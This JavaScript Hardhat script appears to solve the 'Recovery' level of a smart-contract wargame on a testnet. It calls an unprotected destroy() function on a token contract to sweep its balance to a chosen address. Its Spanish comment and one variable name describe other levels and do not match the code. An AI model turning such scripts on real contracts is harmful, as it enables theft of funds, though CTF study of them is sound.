const { ethers } = require("hardhat")
const {
  abi: ABISimpleToken,
} = require("../../artifacts/contracts/17/Recovery.sol/SimpleToken.json")
const { logTxResult } = require("../../utils/logTxResult")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* Hay que aprovar un address para despues llamar a transferFrom. Esta ultima funcion no tiene el lock
Se puede dar allowance de address0 a address0. Asi, no nos hace falta otra wallet
*/
async function main() {
  const recoveryAddress = "0x19dc1c98b47acf7aad7242f6fa050609fecd1be1"
  const recoveryAddressReciever = "0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb"
  /* instance */
  const PreservationContract = new ethers.Contract(
    recoveryAddress,
    ABISimpleToken,
    signer
  )

  const tx = await PreservationContract.destroy(recoveryAddressReciever, {
    gasLimit: 10000000,
  })
  const res = await tx.wait()
  logTxResult(res)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/17/instanceRecoveryAddress.js --network mumbai
*/
